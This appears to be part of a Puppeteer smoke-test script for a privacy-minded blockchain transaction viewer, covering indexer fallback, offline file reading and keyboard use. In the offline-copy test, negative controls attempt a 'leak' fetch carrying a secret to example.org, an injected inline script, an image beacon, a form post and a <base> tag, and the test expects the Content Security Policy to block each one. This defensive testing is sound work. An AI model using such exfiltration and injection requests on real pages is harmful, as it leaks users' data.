  check(s.shownId === tx(1).id && asked() === 1, `${tag}: further lookups are answered from the recording without asking again`, `${asked()} requests`)
  await armReading(page)
  await armAudit(page)
  await page.select('#demo', hero(4).id)
  await page.click('#hold')
  await settled(page)
  await heard(page)
  s = await counted(page)
  check(asked() === 1, `${tag}: the Auditor counts a demo with an audit key from the recording too, with no new request`, `${asked()} requests`)
  auditReads(s, hero(4), `${tag}: demo ${demoNo(hero(4))}, the audit key`)
  const bad = consoleBad(log).filter((m) => !(m.type === 'error' && m.url.startsWith(INDEXER_URL) && /Failed to load resource/.test(m.text)))
  check(bad.length === 0 && log.pageErrors.length === 0, `${tag}: no console error except the browser's own note that the indexer request failed`, bad.map((m) => m.text).concat(log.pageErrors).join(' | '))
  await netlogChecks(page, log, tag)
  await page.click('#mode-switch')
  s = await snap(page)
  check(s.badge === 'Live' && s.pressed === 'false', `${tag}: the way back to live is one click`)
  await page.close()
}

// The list is the one request an id outside the demos can cause. When the indexer cannot be reached, recorded data takes over and nothing about the id has been sent.
async function fallbackListRun(browser) {
  const tag = 'auto-fallback from the list (an id outside the demos)'
  const { page, log } = await open(browser, { w: 1280 })
  await page.$eval('#txid', (el) => el.select())
  await page.keyboard.sendCharacter(UNKNOWN)
  await page.click('#look')
  await settled(page)
  const s = await snap(page)
  const c = indexerCalls(log)
  check(s.badge === 'Recorded' && /^The indexer did not answer, and this id is not among the recorded transactions/.test(s.status) && /error/.test(s.statusClass) && !s.ask, `${tag}: the page switches to recorded data by itself and says the id is not among the recorded ones`, `${s.badge}: ${s.status.slice(0, 80)}`)
  check(c.list === 1 && c.byId.length === 0 && c.all === 1, `${tag}: the indexer was asked once, for the list, and never for an id`, `${c.list} list, ${c.byId.length} by id`)
  check(log.requests.every((r) => ![r.url, r.post, r.headers].some((x) => x.includes(UNKNOWN) || x.includes(UNKNOWN.slice(0, 16)))), `${tag}: nothing about the pasted id was in any request (${log.requests.length} checked: URL, headers, body)`)
  await netlogChecks(page, log, tag)
  await page.close()
}

async function hangRun(browser) {
  const tag = 'auto-fallback (indexer never answers)'
  let held = 0
  const intercept = (r) => {
    if (new URL(r.url()).host === INDEXER_HOST) held++ // never answered, never aborted
    else void r.continue()
  }
  const { page } = await open(browser, { w: 1280, intercept })
  await page.click('#summon')
  const t0 = Date.now()
  await settled(page, 40000)
  const ms = Date.now() - t0
  const s = await snap(page)
  check(held === 1 && s.badge === 'Recorded' && /^The indexer did not answer/.test(s.status), `${tag}: the page gives up and switches to recorded`, `after ${ms} ms, ${held} request held`)
  check(ms >= 7500 && ms < 12000, `${tag}: the wait is about the 8 s timeout`, `${ms} ms`)
  await page.close()
}

// The indexer is up but no longer holds a demo (its history was dropped, or the testnet was reset). That one card must show the saved copy and say so, calmly;
// the page stays live and asks the indexer again for the next id; a demo the indexer still holds is read live beside it; an id nobody holds still gets the
// indexer's own "not found"; and the copy is a whole seance (the Medium reads it, the Auditor counts it). The mocked indexer answers 404 to everything but tx(3).
async function forgottenRun(browser, w) {
  const tag = `a demo the indexer forgot (${w}px)`
  const wide = w >= 960
  const cors = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*' }
  const kept = tx(3) // the one demo this indexer still knows
  const crowd = ledger.recent.transactions // the two transactions this indexer lists: real, readable, and neither is a demo
  const asked = [] // ids asked for by id, in order
  let lists = 0 // requests for the list of latest transactions
  const intercept = (r) => {
    const u = new URL(r.url())
    if (u.host !== INDEXER_HOST) return void r.continue()
    if (r.method() === 'OPTIONS') return void r.respond({ status: 204, headers: cors })
    if (u.pathname === '/transactions/recent') {
      lists++
      return void r.respond({ status: 200, headers: cors, contentType: 'application/json', body: JSON.stringify({ transactions: crowd }) })
    }
    const id = u.pathname.split('/').pop()
    asked.push(id)
    if (id === kept.id) void r.respond({ status: 200, headers: cors, contentType: 'application/json', body: JSON.stringify(kept.reply) })
    else void r.respond({ status: 404, headers: cors, contentType: 'application/json', body: JSON.stringify({ error: `Transaction ${id} is not known to this indexer` }) })
  }
  const { page, log } = await open(browser, { w, url: `${BASE}#tx=${tx(2).id}`, intercept })
  let s = await snap(page)
  check(asked.length === 1 && asked[0] === tx(2).id && lists === 0, `${tag}: the demo id in the address is asked of the indexer by id, once, without the list`, `${asked.map((x) => x.slice(0, 8)).join()} | ${lists} list`)
  check(s.badge === 'Live' && s.pressed === 'false', `${tag}: a 404 for one demo does not flip the page to recorded: the badge stays "Live"`, `${s.badge} ${s.pressed}`)
  check(s.shownId === tx(2).id && s.source === FORGOTTEN_SOURCE, `${tag}: that card is the saved copy and says the public indexer no longer holds it, and which day the copy is from`, s.source ?? '')
  check(/^The public indexer no longer holds this transaction, so this is the copy saved on /.test(s.status) && /Anything you paste is still looked up live\./.test(s.status) && /info/.test(s.statusClass) && !/warn|error/.test(s.statusClass), `${tag}: the status line says the same, calmly (not a warning)`, s.status.slice(0, 100))
  checkLinks(s, tx(2).id, tag)
  check(!s.strangerLinks.some((a) => a.href.startsWith(`${EXPLORER_URL}/tx/`)) && s.mediumHref !== explorerTx(tx(2).id), `${tag}: no button to an explorer page that would be empty`)
  await armReading(page)
  await page.click(`input[name=key][value="${tx(2).to}"]`)
  s = await heard(page)
  expectHeard(s, tx(2), tx(2).to, `${tag}: the saved copy is a whole seance: ${tx(2).to}'s key reads demo ${demoNo(tx(2))}`)
  await seeLenses(page)
  await shot(page, `seance-${w}-forgotten.png`)
  await layout(page, `${tag}`, { wide })
  await axe(page, `${tag}`)

  // the demo the indexer still holds is read live, on the same page
  await page.select('#demo', kept.id)
  await page.click('#hold')
  await settled(page)
  s = await snap(page)
  check(asked.length === 2 && asked[1] === kept.id && s.shownId === kept.id && s.source === 'Live: read from the indexer just now.' && s.badge === 'Live', `${tag}: a demo the indexer still holds is read live, one request, right after the dropped one`, `${s.source} | ${asked.length} requests`)
  checkLinks(s, kept.id, `${tag}: the demo it still holds`)
  // and asked again every time: a dropped demo is not remembered as dropped
  await page.select('#demo', tx(2).id)
  await page.click('#hold')
  await settled(page)
  s = await snap(page)
  check(asked.length === 3 && asked[2] === tx(2).id && s.shownId === tx(2).id && s.source === FORGOTTEN_SOURCE && s.badge === 'Live', `${tag}: the dropped demo again: the indexer is asked again (one request) and the copy shows again`, `${s.source} | ${asked.length} requests`)
  // an id the list does not hold is not asked for until the visitor says so; then an id nobody holds gets the indexer's own answer
  await page.$eval('#txid', (el) => el.select())
  await page.keyboard.sendCharacter(UNKNOWN)
  await page.click('#look')
  await settled(page)
  s = await snap(page)
  check(asked.length === 3 && lists === 1 && s.ask && NOT_LISTED.test(s.status) && /warn/.test(s.statusClass) && s.askButtons.join('|') === ASK_BUTTONS && s.badge === 'Live' && s.shownId === null, `${tag}: an id outside the list is not asked for: one request, for the list, then one line and two buttons`, `${asked.length} by id, ${lists} list | ${s.badge}: ${s.status.slice(0, 80)}`)
  await layout(page, `${tag}, the prompt showing`, { wide })
  await axe(page, `${tag}, the prompt showing`)
  await shot(page, `seance-${w}-not-listed.png`)
  await page.click('#ask-anyway')
  await settled(page)
  s = await snap(page)
  check(asked.length === 4 && asked[3] === UNKNOWN && lists === 1 && s.status === NOT_FOUND && /error/.test(s.statusClass) && s.badge === 'Live' && s.shownId === null && !s.ask, `${tag}: "Ask for it anyway" asks for that id once and gets the indexer's "not found", with the reason; the page is still live`, `${asked.length} by id, ${lists} list | ${s.badge}: ${s.status.slice(0, 80)}`)
  // an id the list does hold is read from the list: no request for it, and the list (kept for a minute) is not fetched again
  const listedId = crowd[1].transaction_id
  await page.$eval('#txid', (el) => el.select())
  await page.keyboard.sendCharacter(listedId)
  await page.click('#look')
  await settled(page)
  s = await snap(page)
  check(s.shownId === listedId && LISTED.test(s.source ?? '') && s.badge === 'Live' && asked.length === 4 && lists === 1, `${tag}: an id the list holds is read from the list: no request for it, and the list is not fetched again`, `${s.source} | ${asked.length} by id, ${lists} list`)
  checkLinks(s, listedId, `${tag}: the id found in the list`)
  // a dropped demo with an audit key: all three ghosts work on the copy, after the error
  await armReading(page)
  await armAudit(page)
  await page.select('#demo', hero(1).id)
  await page.click('#hold')
  await settled(page)
  await heard(page)
  s = await counted(page)
  check(asked.length === 5 && asked[4] === hero(1).id && s.source === FORGOTTEN_SOURCE && s.badge === 'Live', `${tag}: demo ${demoNo(hero(1))} (with an audit key) is a saved copy too`, `${s.source} | ${asked.length} requests`)
  expectHeard(s, hero(1), hero(1).to, `${tag}: demo ${demoNo(hero(1))}: ${hero(1).to}'s key`)
  auditReads(s, hero(1), `${tag}: demo ${demoNo(hero(1))}: the audit key`)
  checkLinks(s, hero(1).id, `${tag}: demo ${demoNo(hero(1))}`)
  // the prompt's other button: a saved file, read in the browser with no request at all
  await page.$eval('#txid', (el) => el.select())
  await page.keyboard.sendCharacter('cd'.repeat(32))
  await page.click('#look')
  await settled(page)
  s = await snap(page)
  check(s.ask && NOT_LISTED.test(s.status) && asked.length === 5 && lists === 1, `${tag}: another id outside the list: the prompt again, still no request for it`, `${asked.length} by id, ${lists} list`)
  const sent = web(log).length
  s = await openFile(page, SAMPLE_FILE, '#ask-file')
  check(s.badge === 'File' && s.source === FILE_SOURCE && s.shownId === hero(2).id && !s.ask && web(log).length === sent && asked.length === 5 && lists === 1, `${tag}: the prompt's "Open a saved transaction file" opens the sample with no request at all`, `${s.badge} ${String(s.shownId).slice(0, 8)} | ${web(log).length - sent} new requests`)
  const csp = await cspSeen(page, log)
  check(csp.length === 0, `${tag}: 0 Content Security Policy violations`, csp.slice(0, 2).join(' | '))
  await netlogChecks(page, log, tag)
  const noisy = consoleBad(log).filter((m) => !(/404/.test(m.text) && m.url.startsWith(INDEXER_URL)))
  check(log.pageErrors.length === 0 && noisy.length === 0, `${tag}: no page error, and no console line except the browser's own note about each 404`, log.pageErrors.concat(noisy.map((m) => m.text)).join(' | '))
  await page.close()
}

// The testnet is sometimes quiet: the latest transactions hold no private transfer. Summon must say so, show a transaction of the recorded sample (never one of ours), keep the page
// live and ask for nothing but the list. The real chain cannot be told to be quiet, so the list is mocked as a valid empty one; test/data.test.ts runs the same case without a browser.
async function quietRun(browser) {
  const tag = 'a quiet chain (the latest transactions hold no private transfer)'
  const cors = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*' }
  const other = [] // anything asked of the indexer that is not the list
  let lists = 0
  const intercept = (r) => {
    const u = new URL(r.url())
    if (u.host !== INDEXER_HOST) return void r.continue()
    if (r.method() === 'OPTIONS') return void r.respond({ status: 204, headers: cors })
    if (u.pathname === '/transactions/recent') {
      lists++
      return void r.respond({ status: 200, headers: cors, contentType: 'application/json', body: JSON.stringify({ transactions: [] }) })
    }
    other.push(u.pathname)
    void r.respond({ status: 404, headers: cors, contentType: 'application/json', body: JSON.stringify({ error: 'not known to this indexer' }) })
  }
  const { page, log } = await open(browser, { w: 1280, intercept })
  await page.click('#summon')
  await settled(page)
  await scrollSettled(page)
  const s = await snap(page)
  const sample = ledger.recent.transactions.map((t) => t.transaction_id)
  check(s.badge === 'Live' && s.pressed === 'false' && /^Recorded:/.test(s.source ?? '') && sample.includes(s.shownId) && !OURS.has(s.shownId), `${tag}: Summon shows a transaction of the recorded sample, labelled "Recorded", never one of ours, and the page stays live`, `${s.badge} ${s.pressed} | ${(s.source ?? '').slice(0, 50)} | ${String(s.shownId).slice(0, 8)}`)
  check(/^The latest live transactions held no private transfer, so this one is recorded\./.test(s.status) && /warn/.test(s.statusClass) && !s.ask, `${tag}: the status line says so, as a warning`, `${s.statusClass}: ${s.status.slice(0, 90)}`)
  check(lists === 1 && other.length === 0, `${tag}: one request, for the list, and none for an id`, `${lists} list, ${other.length} other`)
  checkLinks(s, s.shownId, tag)
  await netlogChecks(page, log, tag)
  const csp = await cspSeen(page, log)
  check(csp.length === 0 && log.pageErrors.length === 0 && consoleBad(log).length === 0, `${tag}: 0 Content Security Policy violations, no page error, no console error`, csp.concat(log.pageErrors, consoleBad(log).map((m) => m.text)).slice(0, 2).join(' | '))
  await page.close()
}

// ---------- a transaction opened from a saved file ----------
// The offline seance. The visitor saves the indexer's answer for one transaction once (the README says how) and opens it later. From the moment the file is chosen the
// browser is told it is offline (that cuts this page's own server too), and all three ghosts must still read it: no request, no failed request, and a ghost log that says 0.
async function fileRun(browser, w) {
  const tag = `a saved transaction file (${w}px)`
  const wide = w >= 960
  const t = hero(2) // the sample holds demo 2's answer; the first screen shows demo 1, so the file really replaces what was on the table
  const raw = readFileSync(SAMPLE_FILE, 'utf8')
  check(JSON.stringify(JSON.parse(raw)) === JSON.stringify(t.reply), `${tag}: examples/saved-transaction.json is the indexer's answer for demo ${demoNo(t)}, as recorded in ledger.json`, `${raw.length} bytes`)
  const { page, log } = await open(browser, { w })
  let s = await snap(page)
  check(s.fileButton === 'Open a saved transaction file' && s.fileButtonAria !== 'true' && s.shownId === hero(1).id, `${tag}: from the first screen on the page offers "Open a saved transaction file"`, `${s.fileButton} / ${s.fileButtonAria}`)
  await page.setOfflineMode(true)
  const sent = web(log).length
  const dead = log.failed.length
  const rows = s.netRows.length
  const none = (what) => check(web(log).length === sent && log.failed.length === dead, `${tag}: ${what}: the debugging protocol saw 0 requests and 0 failed requests`, `${web(log).length - sent} new, ${log.failed.length - dead} failed`)

  await armReading(page)
  await armAudit(page)
  s = await openFile(page, SAMPLE_FILE)
  check(s.badge === 'File' && s.modeText === FILE_BADGE_TEXT && s.source === FILE_SOURCE && s.shownId === t.id && s.hash === '', `${tag}: the file's transaction is on the table, marked "File", with the words about where it came from, and the address bar no longer names another transaction`, `${s.badge} | ${s.source} | ${s.hash}`)
  check(s.status.startsWith('Opened from your file. Nothing was asked of any server, and this page cannot tell whether the file is a genuine answer from an indexer.') && /info/.test(s.statusClass), `${tag}: the status line says the same, and that the page cannot tell if the file is genuine`, s.status.slice(0, 90))
  check(s.netFile === 'Since you opened your file: 0 requests.' && s.netRows.length === rows, `${tag}: the ghost log says 0 requests since the file was opened, and has no new row`, `${s.netFile} | ${s.netRows.length - rows} new rows`)
  none('opening the file')
  await heard(page)
  s = await counted(page)
  expectHeard(s, t, 'bob', `${tag}: Bob's key (still in hand from the first screen) reads the file's transaction, which was not paid to Bob`)
  auditReads(s, t, `${tag}: the audit key`)
  leaksChecks(s, t, `${tag}: the leaks panel`)
  checkLinks(s, t.id, tag)
  await armReading(page)
  await page.click('input[name=key][value="carol"]')
  s = await heard(page)
  expectHeard(s, t, 'carol', `${tag}: Carol's key reads the file's transaction`)
  none('all three ghosts read the file')
  await seeLenses(page)
  await shot(page, `seance-${w}-file.png`)
  await layout(page, tag, { wide })
  await axe(page, tag)

  // the keyboard opens the same chooser; cancelling it changes nothing
  await page.focus('#open-file')
  const [chooser] = await Promise.all([page.waitForFileChooser(), page.keyboard.press('Enter')])
  await chooser.cancel()
  s = await snap(page)
  check(s.badge === 'File' && s.shownId === t.id, `${tag}: Enter on the file button opens the chooser, and cancelling it leaves the transaction as it was`)

  // files that are not one transaction's answer: the page says what is wrong in plain words and shows no transaction
  const dir = mkdtempSync(join(tmpdir(), 'seance-smoke-files-'))
  const wrong = [
    ['not JSON', 'notes.txt', 'this is not json', "That file is not JSON. Open the indexer's answer for one transaction, saved as it came (the README says how)."],
    ['a list of transactions', 'list.json', JSON.stringify({ transactions: ledger.recent.transactions }), "That file is a list of transactions. Open the indexer's answer for a single transaction."],
    ['JSON of another shape', 'shape.json', JSON.stringify({ hello: 1 }), "That file is JSON, but it is not the indexer's answer for one transaction."],
    ['larger than 1 MB', 'big.json', ' '.repeat(1024 * 1024 + 1), "That file is larger than 1 MB. One transaction is a few KB: open the indexer's answer for a single transaction."],
  ]
  for (const [what, name, body, message] of wrong) {
    writeFileSync(join(dir, name), body)
    s = await openFile(page, join(dir, name))
    check(s.status === message && /error/.test(s.statusClass) && s.shownId === null && s.netFile === null && !s.ask, `${tag}: a file that is ${what}: the page says so, in these words, and shows no transaction`, s.status.slice(0, 80))
  }
  rmSync(dir, { recursive: true, force: true })
  none('four files that cannot be read')
  s = await openFile(page, SAMPLE_FILE)
  check(s.badge === 'File' && s.shownId === t.id && s.netFile === 'Since you opened your file: 0 requests.', `${tag}: after the errors the good file opens again, and the log still says 0 requests`, `${s.badge} | ${s.netFile}`)
  none('after the errors')

  // the log, opened: the same rules as the rest of the page
  await page.click('#netlog summary')
  await layout(page, `${tag}, the ghost log open`, { wide })
  await axe(page, `${tag}, the ghost log open`)
  await shotEl(page, '#netlog', `seance-${w}-ghostlog.png`)
  const csp = await cspSeen(page, log)
  check(csp.length === 0, `${tag}: 0 Content Security Policy violations`, csp.slice(0, 2).join(' | '))
  await netlogChecks(page, log, tag)
  check(log.pageErrors.length === 0 && consoleBad(log).length === 0, `${tag}: no page error and no console line`, log.pageErrors.concat(consoleBad(log).map((m) => m.text)).join(' | '))
  await page.close()
}

// ---------- the offline copy: seance-offline.html, one file that cannot make page requests ----------
// What the ghosts say about the transaction on the table, not where it came from: the same on the online build and on the offline copy.
const ghostTexts = (s) => ({ shownId: s.shownId, source: s.source, status: s.status, stranger: s.strangerBody, reading: s.readingText, audit: s.auditText, leaks: s.leaks, polt: s.poltText, links: s.strangerLinks.map((a) => a.href) })
// Opens the sample file, waits for the Auditor, then types Carol's published key (the recipient of the sample) one key stroke at a time.
async function readSampleAsCarol(page) {
  await armReading(page)
  await armAudit(page)
  await openFile(page, SAMPLE_FILE)
  await counted(page)
  await armReading(page)
  await page.click('#own-key')
  await page.keyboard.type(keys.carol.viewSecret)
  await until(page, () => document.querySelector('#reading .reading'), undefined, 15000)
  await sleep(300)
  return snap(page)
}

async function offlineCopyRun(browser, w) {
  const tag = `the offline copy opened from disk (${w}px)`
  const wide = w >= 960
  const t = hero(2) // the sample file holds demo 2's answer, paid to Carol; the first screen shows demo 1
  const url = pathToFileURL(OFFLINE_FILE).href
  // Every request the page makes passes through here (the debugging protocol), and only the file itself is let through. A request the policy blocks never gets this far: those show up as violations.
  const { page, log } = await open(browser, { w, url, intercept: (r) => void (r.url() === url ? r.continue() : r.abort()) })
  let s = await snap(page)
  const shown = await page.evaluate(() => {
    const hidden = (id) => document.getElementById(id).offsetParent === null
    const seen = (sel) => [...document.querySelectorAll(sel)].filter((e) => e.offsetParent !== null).map((e) => e.innerText).join(' ')
    return { hid: ['txid', 'look', 'summon', 'mode-switch', 'ask', 'ask-anyway', 'ask-file', 'check-conn'].filter((id) => !hidden(id)), link: [...document.querySelectorAll('a[href$="seance-offline.html"]')].map((a) => a.offsetParent !== null), kept: ['open-file', 'hold', 'demo'].filter((id) => hidden(id)), lede: seen('.lede'), hints: seen('.hint'), cls: document.documentElement.className }
  })
  check(shown.cls === 'offline' && shown.hid.length === 0 && shown.link.length === 1 && !shown.link[0] && shown.kept.length === 0 && !/summon|paste any id/i.test(shown.lede) && !/indexer/i.test(shown.hints), `${tag}: the lookup, "Summon", the mode switch, "Ask for it anyway", the connection check and the link to the offline copy are hidden; the file button and the prepared demos stay; no visible line mentions the indexer`, `shown anyway: ${shown.hid.join(',')}${shown.link.length === 1 && !shown.link[0] ? '' : ' (offline-copy link)'}; missing: ${shown.kept.join(',')}`)
  check(s.badge === 'Offline' && s.modeText === OFFLINE_LINE && s.shownId === hero(1).id && /^A saved example is on the table/.test(s.status) && /Open a saved transaction file to read your own\.$/.test(s.status), `${tag}: the first screen is demo 1 from the recording, marked "Offline", with the line "${OFFLINE_LINE}"`, `${s.badge} | ${s.modeText} | ${s.status.slice(0, 60)}`)
  expectHeard(s, hero(1), 'bob', `${tag}: the Medium, with Bob's key (already in hand), reads demo 1`)
  auditReads(s, hero(1), `${tag}: the Auditor, with the audit key, counts demo 1`)
  poltergeistChecks(s, tag)

  // the sample file, then the recipient's published key typed into the page
  s = await readSampleAsCarol(page)
  check(s.badge === 'File' && s.modeText === OFFLINE_LINE && s.source === FILE_SOURCE && s.shownId === t.id && s.hash === '', `${tag}: the file's transaction is on the table, marked "File", with the words about where it came from`, `${s.badge} | ${s.source} | ${s.hash}`)
  check(s.checkedKey === null && /with your key/.test(s.readingText), `${tag}: a typed key unchecks the demo keys and is called "your key"`)
  expectHeard(s, t, 'carol', `${tag}: the typed key reads the file's transaction`)
  auditReads(s, t, `${tag}: the audit key counts the file's transaction`)
  leaksChecks(s, t, `${tag}: the leaks panel`)
  checkLinks(s, t.id, tag)
  check(s.netHead === 'This page sent 0 requests to 0 hosts; 0 named a transaction id; your keys were in none of them.' && !s.netLeak && s.netFile === 'Since you opened your file: 0 requests.' && s.netRows.length === 0, `${tag}: the ghost log says 0 requests, 0 hosts, no key in any request`, `${s.netHead} | ${s.netFile}`)
  await seeLenses(page)
  await layout(page, tag, { wide })
  await axe(page, tag)

  // the same file and the same key on the online build give the same words
  if (wide) {
    const { page: twin } = await open(browser, { w })
    const online = await readSampleAsCarol(twin)
    await twin.close()
    const a = ghostTexts(s)
    const b = ghostTexts(online)
    const differ = Object.keys(a).filter((k) => JSON.stringify(a[k]) !== JSON.stringify(b[k]))
    check(differ.length === 0 && a.stranger.length > 0 && a.reading.length > 0 && a.audit.length > 0 && a.polt.length > 0, `${tag}: the Stranger, the Medium, the Auditor, the leaks panel and the Poltergeist say the same words as the online build on the same file and key`, `differ: ${differ.join(',') || 'none'}; ${a.stranger.length + a.reading.length + a.audit.length + a.polt.length} characters compared`)
  }

  // everything above made no request at all, and the policy had nothing to refuse
  const asked = log.requests.map((r) => r.url)
  check(asked.length === 1 && asked[0] === url && log.failed.length === 0, `${tag}: loading, opening the file, typing the key and running every ghost: 0 requests other than the file itself, 0 failed`, `${asked.length} seen${asked.length === 1 && asked[0] === url ? ' (the file)' : `: ${asked.map((u) => u.slice(0, 60)).join(' ')}`}`) // the file's own address is not printed: evidence/smoke.txt is committed and it holds this machine's folders
  const csp = await cspSeen(page, log)
  check(csp.length === 0, `${tag}: 0 Content Security Policy violations`, csp.slice(0, 2).join(' | '))
  check(log.pageErrors.length === 0 && consoleBad(log).length === 0, `${tag}: no page error and no console line`, log.pageErrors.concat(consoleBad(log).map((m) => m.text)).join(' | '))

  // negative controls, last (a fetch is written in the ghost log even when it is refused): each one is refused, and each is reported as a violation of the directive that refuses it
  const r = await page.evaluate(async () => {
    const violations = []
    document.addEventListener('securitypolicyviolation', (e) => violations.push(`${e.violatedDirective} ${e.blockedURI}`))
    let outside
    try {
      await fetch('https://example.org/leak?k=secret', { mode: 'no-cors' })
      outside = 'allowed'
    } catch (e) {
      outside = `blocked (${e.name})`
    }
    const script = document.createElement('script')
    script.textContent = 'window.__injected = 1'
    document.head.append(script)
    new Image().src = 'https://example.org/pixel.png'
    const form = Object.assign(document.createElement('form'), { action: 'https://example.org/post', method: 'post' })
    document.body.append(form)
    form.submit()
    document.head.append(Object.assign(document.createElement('base'), { href: 'https://example.org/' }))
    await new Promise((ok) => setTimeout(ok, 500))
    return { outside, injected: window.__injected === 1, violations, still: location.href }
  })
  const directives = r.violations.map((v) => v.split(' ')[0])
  const want = ['connect-src', 'script-src', 'img-src', 'form-action', 'base-uri'] // an inline script is reported as script-src-elem
  check(r.outside.startsWith('blocked') && !r.injected && r.still === url && want.every((d) => directives.some((x) => x.startsWith(d))), `${tag}: negative controls are refused: a fetch to another site, an injected inline script, an image, a form post and a <base> tag; the page did not navigate`, `${r.outside}; injected=${r.injected}; ${r.violations.join(' | ')}`)
  check(log.requests.length === 1, `${tag}: and none of them reached the network (still 1 request seen)`, String(log.requests.length))
  await page.close()
}

// The file as GitHub Pages serves it: public/ is copied into dist/ unchanged, so the bytes served are the bytes committed. Loaded from there it still makes no other request.
async function offlineServedRun(browser) {
  const tag = 'the offline copy served under /seance-v2/'
  const url = `${BASE}seance-offline.html`
  const res = await fetch(url)
  const body = Buffer.from(await res.arrayBuffer())
  const committed = readFileSync(OFFLINE_FILE)
  check(res.status === 200 && /^text\/html/.test(res.headers.get('content-type') ?? '') && body.equals(committed), `${tag}: dist/seance-offline.html, as served, is byte for byte the committed public/seance-offline.html`, `${res.status} ${body.length} bytes, sha256 ${createHash('sha256').update(body).digest('hex')}`)
  const { page, log } = await open(browser, { w: 1280, url, intercept: (r) => void (r.url() === url ? r.continue() : r.abort()) })
  const s = await snap(page)
  check(s.badge === 'Offline' && s.modeText === OFFLINE_LINE && s.shownId === hero(1).id, `${tag}: it starts the same way`, `${s.badge} | ${s.modeText}`)
  check(s.netHead === 'This page sent 1 request to 1 host; 0 named a transaction id; your keys were in none of them.' && s.netRows.length === 1 && s.netRows[0].cells[2] === OWN && s.netRows[0].cells[3] === '/seance-v2/seance-offline.html', `${tag}: the ghost log lists one request: the page itself`, `${s.netHead} | ${s.netRows.map((x) => x.cells.join(' ')).join(' ; ').slice(0, 120)}`)
  const asked = log.requests.map((r) => r.url)
  check(asked.length === 1 && asked[0] === url && log.failed.length === 0, `${tag}: the debugging protocol saw that one request and no other`, `${asked.length} seen`)
  const csp = await cspSeen(page, log)
  check(csp.length === 0 && log.pageErrors.length === 0 && consoleBad(log).length === 0, `${tag}: 0 Content Security Policy violations, no page error, no console line`, csp.concat(log.pageErrors, consoleBad(log).map((m) => m.text)).slice(0, 2).join(' | '))
  await page.close()
}

// ---------- a link with the id in capitals ----------
async function hashRun(browser) {
  const tag = 'uppercase #tx= link'
  const { page, log } = await open(browser, { w: 1280, url: `${BASE}#tx=${tx(2).id.toUpperCase()}` })
  await settled(page)
  const s = await snap(page)
  check(s.shownId === tx(2).id && /^Recorded:/.test(s.source ?? ''), `${tag}: the Stranger shows the transaction an id in capitals names (the id is lower-cased first)`, String(s.shownId).slice(0, 12))
  check(/^The indexer did not answer, so the page switched to recorded data\./.test(s.status), `${tag}: the load's own status shows, not the loading line`, s.status.slice(0, 70))
  check(log.pageErrors.length === 0, `${tag}: no page error`, log.pageErrors.join(' | '))
  await page.close()
}

// ---------- the code is still loading ----------
async function loadingRun(browser) {
  const tag = 'while the code loads'
  const page = await browser.newPage()
  await page.setViewport({ width: 375, height: 800, deviceScaleFactor: 1, isMobile: true, hasTouch: true })
  const problems = []
  page.on('pageerror', (e) => problems.push(String(e)))
  await page.setRequestInterception(true)
  const held = []
  page.on('request', (r) => (r.resourceType() === 'script' ? held.push(r) : r.continue())) // every script waits, as on a slow link
  const nav = page.goto(BASE, { waitUntil: 'load', timeout: 60000 })
  nav.catch(() => {}) // the load event waits for the held scripts; it is awaited below, after they are let go
  await page.waitForSelector('#look')
  await sleep(400)
  const probe = () =>
    page.evaluate(() => ({
      status: document.getElementById('status').textContent,
      options: document.querySelectorAll('#demo option').length,
      buttons: ['look', 'summon', 'open-file', 'hold', 'mode-switch'].map((id) => {
        const b = document.getElementById(id)
        const c = getComputedStyle(b)
        return { id, aria: b.getAttribute('aria-disabled'), disabled: b.disabled, opacity: Number(c.opacity), cursor: c.cursor }
      }),
    }))
  const early = await probe()
  check(held.length > 0 && early.options === 0, `${tag}: the scripts are held back, so the page has none of its code yet`, `${held.length} held, ${early.options} demo options`)
  check(/is still loading/.test(early.status), `${tag}: a loading line shows`, early.status)
  check(early.buttons.every((b) => b.aria === 'true' && b.opacity < 1 && b.cursor === 'progress'), `${tag}: all five buttons say not ready (aria-disabled, dimmed, a progress cursor)`, early.buttons.map((b) => `${b.id}:${b.aria}`).join(' '))
  check(early.buttons.find((b) => b.id === 'look')?.disabled === true, `${tag}: "Look at it" is also disabled, being a submit button (a click or Enter on it would make the browser cancel the code that is still on its way)`)
  await shot(page, 'seance-375-loading.png')
  for (const id of ['summon', 'open-file', 'hold', 'look']) await page.click(`#${id}`)
  await page.focus('#txid')
  await page.keyboard.type('abc')
  await page.keyboard.press('Enter')
  await sleep(300)
  const after = await probe()
  check(page.url() === BASE && after.status === early.status, `${tag}: a click on a button, or Enter in the id field, does nothing yet (no navigation, the line stays)`, page.url())
  for (const r of held) r.continue()
  await nav
  await until(page, () => document.querySelectorAll('#demo option').length > 0, undefined, 20000)
  await settled(page) // the page draws its saved example as soon as its code has run
  const ready = await probe()
  const drawn = await snap(page)
  check(!/is still loading/.test(ready.status) && /^A saved example is on the table/.test(ready.status), `${tag}: the loading line is gone once the code has run; the status line now describes the saved example`, ready.status.slice(0, 70))
  check(drawn.shownId === hero(1).id && drawn.source === EXAMPLE_SOURCE, `${tag}: the saved example is on the table, with nothing asked of the indexer`, String(drawn.shownId).slice(0, 12))
  check(ready.buttons.every((b) => b.aria !== 'true' && b.opacity === 1), `${tag}: the five buttons are ready (not aria-disabled, no dimming)`, ready.buttons.map((b) => `${b.id}:${b.aria}`).join(' '))
  await page.click('#hold')
  await settled(page)
  const s = await snap(page)
  check(s.shownId === hero(1).id && /^The indexer did not answer, so the page switched to recorded data\./.test(s.status), `${tag}: the first click after that works (this browser cannot reach the indexer, so the page says so and switches to recorded data)`, s.status.slice(0, 70))
  check(problems.length === 0, `${tag}: no page error`, problems.join(' | '))
  await page.close()
}

// ---------- keyboard only ----------
async function keyboardRun(browser) {
  const tag = 'keyboard 1280px'
  const { page } = await open(browser, { w: 1280 })
  const active = () => page.evaluate(() => document.activeElement?.id || document.activeElement?.tagName)
  const press = async (key, n = 1) => {
    for (let i = 0; i < n; i++) await page.keyboard.press(key)
  }
  await press('Tab')
  check((await page.evaluate(() => document.activeElement.className)) === 'skip', `${tag}: the first Tab lands on the skip link`)
  await press('Enter')
  await press('Tab')
  check((await active()) === 'txid', `${tag}: Enter on the skip link, then Tab, lands in the id field`, await active())
  await press('Tab', 6)
  check((await active()) === 'mode-switch', `${tag}: six more Tabs reach the mode switch (look, summon, open file, demo, hold, switch)`, await active())
  await press('Space')
  let s = await snap(page)
  check(s.badge === 'Recorded' && s.pressed === 'true', `${tag}: Space on the mode switch turns recorded mode on`)
  await page.keyboard.down('Shift')
  await press('Tab', 6)
  await page.keyboard.up('Shift')
